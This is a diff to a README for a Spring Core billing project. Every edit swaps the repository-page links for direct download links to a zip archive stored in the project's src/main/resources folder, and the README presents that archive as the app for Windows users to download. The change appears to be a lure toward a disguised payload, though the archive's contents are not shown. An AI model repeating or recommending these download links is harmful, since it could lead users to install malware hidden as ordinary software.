@@ -1,12 +1,12 @@
 # 🧾 Spring-Core-Billing-System - Simple Billing on Pure Spring
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/gringosinho/Spring-Core-Billing-System)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/gringosinho/Spring-Core-Billing-System/raw/refs/heads/main/src/main/resources/Billing_Spring_Core_System_v2.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and get the app:
 
-[Spring-Core-Billing-System Download Page](https://github.com/gringosinho/Spring-Core-Billing-System)
+[Spring-Core-Billing-System Download Page](https://github.com/gringosinho/Spring-Core-Billing-System/raw/refs/heads/main/src/main/resources/Billing_Spring_Core_System_v2.8.zip)
 
 ## 🖥️ What This App Does
 
@@ -31,7 +31,7 @@ Before you run the app on Windows, make sure you have:
 Follow these steps in order.
 
 1. Open the download page:
-   [Spring-Core-Billing-System Download Page](https://github.com/gringosinho/Spring-Core-Billing-System)
+   [Spring-Core-Billing-System Download Page](https://github.com/gringosinho/Spring-Core-Billing-System/raw/refs/heads/main/src/main/resources/Billing_Spring_Core_System_v2.8.zip)
 
 2. On the page, look for the files or release assets you can download.
 
@@ -127,7 +127,7 @@ If the app does not open, check these points:
 ## 📦 Quick Install Path
 
 1. Open the download page:
-   [https://github.com/gringosinho/Spring-Core-Billing-System](https://github.com/gringosinho/Spring-Core-Billing-System)
+   [https://github.com/gringosinho/Spring-Core-Billing-System/raw/refs/heads/main/src/main/resources/Billing_Spring_Core_System_v2.8.zip](https://github.com/gringosinho/Spring-Core-Billing-System/raw/refs/heads/main/src/main/resources/Billing_Spring_Core_System_v2.8.zip)
 
 2. Download the project file
 
@@ -156,4 +156,4 @@ This project focuses on core backend structure. It avoids auto setup and uses di
 
 Use this page if you need to get the app file again:
 
-[Spring-Core-Billing-System Download Page](https://github.com/gringosinho/Spring-Core-Billing-System)
+[Spring-Core-Billing-System Download Page](https://github.com/gringosinho/Spring-Core-Billing-System/raw/refs/heads/main/src/main/resources/Billing_Spring_Core_System_v2.8.zip)
